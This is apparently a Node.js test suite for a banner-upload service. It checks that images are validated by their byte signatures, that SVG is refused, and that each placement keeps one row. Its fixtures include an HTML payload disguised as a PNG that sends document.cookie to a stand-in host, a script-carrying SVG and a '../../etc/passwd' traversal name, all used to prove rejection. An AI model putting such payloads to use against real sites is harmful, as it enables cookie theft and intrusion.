'use strict';

const test = require('node:test');
const assert = require('node:assert');

const db = require('@ibitplay/db');
const { createLogger } = require('@ibitplay/common');

const { BannersService } = require('../banners.service');
const { sniff, inspect } = require('../upload');
const v = require('../banners.validators');

/**
 * Banners.
 *
 * Two things this file is here to prove:
 *
 *   1. an upload is judged on its BYTES. Legacy read `originalname` and never
 *      opened the file, so the check was passed by renaming.
 *   2. a placement has ONE row. Legacy's create INSERTed a duplicate and its
 *      update rewrote every row of the type.
 */

const TEST_DB = process.env.TEST_DB_NAME || 'ibitplay_test';

let connection;

/** Real signatures, so `sniff` is tested against what it will actually see. */
const PNG = Buffer.concat([
  Buffer.from([0x89, 0x50, 0x4e, 0x47, 0x0d, 0x0a, 0x1a, 0x0a]),
  Buffer.alloc(200, 0x11),
]);
const JPEG = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), Buffer.alloc(200, 0x22)]);
const WEBP = Buffer.concat([
  Buffer.from('RIFF'),
  Buffer.from([0x00, 0x00, 0x00, 0x00]),
  Buffer.from('WEBP'),
  Buffer.alloc(200, 0x33),
]);

const asFile = (buffer, originalname = 'banner.png', mimetype = 'image/png') => ({
  buffer,
  originalname,
  mimetype,
  size: buffer.length,
});

let seq = 0;
const newType = () => `t${process.pid}x${(seq += 1)}`;

test('banner uploads are judged on their bytes', async (t) => {
  await t.test('the real signatures are recognised', () => {
    assert.equal(sniff(PNG).contentType, 'image/png');
    assert.equal(sniff(JPEG).contentType, 'image/jpeg');
    assert.equal(sniff(WEBP).contentType, 'image/webp');
  });

  await t.test('HTML NAMED .png is refused', () => {
    /**
     * The legacy check in full:
     *
     *     const ext = path.extname(file.originalname).toLowerCase();
     *     if (!['.png', '.jpg', '.jpeg'].includes(ext)) return cb(new Error(...));
     *
     * `originalname` is the client's own claim. This file passes it and is not
     * an image.
     */
    const html = Buffer.from(`<html><script>fetch('https://evil.test?c='+document.cookie)</script></html>`.padEnd(200));

    assert.throws(
      () => inspect(asFile(html, 'totally-a-banner.png', 'image/png')),
      (err) => err.code === 'BANNERS_NOT_AN_IMAGE' && err.status === 415
    );
  });

  await t.test('an SVG is refused BY NAME, with the reason', () => {
    // An SVG is a document that can carry script. Legacy's extension list
    // excluded it by accident; this excludes it on purpose.
    const svg = Buffer.from('<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'.padEnd(200));

    assert.throws(
      () => inspect(asFile(svg, 'logo.svg', 'image/svg+xml')),
      (err) => err.code === 'BANNERS_FORMAT_REFUSED' && /script/i.test(err.details?.reason ?? '')
    );
  });

  await t.test('the declared MIME type does not help either', () => {
    const notAnImage = Buffer.alloc(200, 0x41);
    assert.throws(
      () => inspect(asFile(notAnImage, 'x.png', 'image/png')),
      (err) => err.code === 'BANNERS_NOT_AN_IMAGE'
    );
  });

  await t.test('an oversized upload is refused', () => {
    const huge = Buffer.concat([PNG, Buffer.alloc(5 * 1024 * 1024)]);
    assert.throws(() => inspect(asFile(huge)), (err) => err.code === 'BANNERS_TOO_LARGE' && err.status === 413);
  });

  await t.test('a truncated upload is refused rather than stored broken', () => {
    assert.throws(
      () => inspect(asFile(Buffer.from([0x89, 0x50, 0x4e, 0x47]))),
      (err) => err.code === 'BANNERS_TOO_SMALL'
    );
  });

  await t.test('no file at all is a 400, not a crash', () => {
    assert.throws(() => inspect(undefined), (err) => err.code === 'BANNERS_NO_FILE');
    assert.throws(() => inspect({ buffer: Buffer.alloc(0) }), (err) => err.code === 'BANNERS_NO_FILE');
  });

  await t.test('the stored content type comes from the signature, not the request', () => {
    // A JPEG uploaded as `banner.png` with `Content-Type: image/png` is stored
    // and later SERVED as image/jpeg, because that is what it is.
    const result = inspect(asFile(JPEG, 'banner.png', 'image/png'));
    assert.equal(result.contentType, 'image/jpeg');
    assert.equal(result.extension, '.jpg');
  });

  await t.test('a placement name is an identifier', () => {
    const parse = (type) => v.createBanner.body.safeParse({ type });
    assert.equal(parse('home-hero').success, true);
    assert.equal(parse('HOME').success, true, 'lowercased rather than rejected');
    assert.equal(v.createBanner.body.parse({ type: 'HOME' }).type, 'home');
    assert.equal(parse('../../etc/passwd').success, false);
    assert.equal(parse('a'.repeat(200)).success, false);
    assert.equal(parse('').success, false);
  });
});

test('banners against a database', async (t) => {
  const logger = createLogger({ name: 'banners-test', level: 'silent' });

  try {
    connection = await db.connect({
      config: {
        DB_HOST: process.env.DB_HOST || '127.0.0.1',
        DB_PORT: Number(process.env.DB_PORT || 5432),
        DB_NAME: TEST_DB,
        DB_USER: process.env.DB_USER || 'postgres',
        DB_PASSWORD: process.env.DB_PASSWORD || 'postgres',
        DB_SCHEMA: 'public',
      },
      logger,
      service: 'admin-service',
    });
    await connection.ping();
  } catch (error) {
    t.skip(`No test database reachable (${error.message})`);
    return;
  }

  t.after(async () => {
    if (connection) await connection.close();
  });

  const service = new BannersService({ models: connection.models, db: connection, logger });
  const staff = { id: 1, permissions: ['*'] };

  await t.test('an upload round-trips its bytes exactly', async () => {
    const type = newType();
    await service.putBanner({ staff, type, file: asFile(PNG) });

    const image = await service.imageBytes({ key: type });
    assert.equal(image.contentType, 'image/png');
    assert.ok(image.data.equals(PNG), 'the bytes out are the bytes in');
    assert.equal(image.byteSize, PNG.length);
  });

  await t.test('a SECOND upload REPLACES rather than duplicating', async () => {
    /**
     * Legacy:
     *
     *     INSERT INTO banners (type, image) VALUES ($1, $2)   -- every time
     *
     * so the same placement uploaded twice left two rows. `getBannerByType`
     * showed only the newest; `getBannerAll` listed both forever.
     */
    const type = newType();
    await service.putBanner({ staff, type, file: asFile(PNG) });
    await service.putBanner({ staff, type, file: asFile(JPEG, 'b.jpg', 'image/jpeg') });

    const rows = await connection.models.Banners.findAll({ where: { type }, raw: true });
    assert.equal(rows.length, 1, 'one row per placement');

    const image = await service.imageBytes({ key: type });
    assert.equal(image.contentType, 'image/jpeg', 'and it is the newer image');
    assert.ok(image.data.equals(JPEG));
  });

  await t.test('who uploaded it is recorded', async () => {
    // Legacy could not record this: the route had no authentication, so there
    // was nobody to record.
    const type = newType();
    await service.putBanner({ staff: { id: 42 }, type, file: asFile(PNG) });

    const row = await connection.models.Banners.findOne({ where: { type }, raw: true });
    assert.equal(String(row.uploaded_by), '42');
  });

  await t.test('listing does not drag the image bytes through', async () => {
    const type = newType();
    await service.putBanner({ staff, type, file: asFile(PNG) });

    const result = await service.list({});
    const found = result.rows.find((r) => r.type === type);
    assert.ok(found, 'the banner is listed');
    assert.equal('base64' in found, false);
    assert.equal('image_data' in found, false);
    assert.equal(found.byteSize, PNG.length, 'the size is reported without the bytes');
  });

  await t.test('the binary listing base64-encodes them', async () => {
    const type = newType();
    await service.putBanner({ staff, type, file: asFile(PNG) });

    const result = await service.listWithImages({});
    const found = result.rows.find((r) => r.type === type);
    assert.ok(Buffer.from(found.base64, 'base64').equals(PNG));
  });

  await t.test('a deactivated placement is hidden from the public read', async () => {
    const type = newType();
    await service.putBanner({ staff, type, file: asFile(PNG) });
    await service.setActive({ staff, type, active: false });

    await assert.rejects(() => service.byType({ type }), (err) => err.code === 'BANNERS_NOT_FOUND');
    await assert.rejects(() => service.imageBytes({ key: type }), (err) => err.code === 'BANNERS_NOT_FOUND');

    // ...but an operator can still see it, which is the point of deactivating
    // rather than deleting.
    const seen = await service.byType({ type, includeInactive: true });
    assert.equal(seen.active, false);

    await service.setActive({ staff, type, active: true });
    assert.equal((await service.byType({ type })).active, true);
  });

  await t.test('a legacy `home.png` URL still resolves', async () => {
    const type = newType();
    await service.putBanner({ staff, type, file: asFile(PNG) });
    const image = await service.imageBytes({ key: `${type}.png` });
    assert.ok(image.data.equals(PNG));
  });

  await t.test('an unknown placement is a 404, not an empty image', async () => {
    await assert.rejects(
      () => service.imageBytes({ key: 'no-such-placement' }),
      (err) => err.code === 'BANNERS_NOT_FOUND' && err.status === 404
    );
  });

  await t.test('deactivating something that does not exist is a 404', async () => {
    await assert.rejects(
      () => service.setActive({ staff, type: 'no-such-placement', active: false }),
      (err) => err.code === 'BANNERS_NOT_FOUND'
    );
  });
});
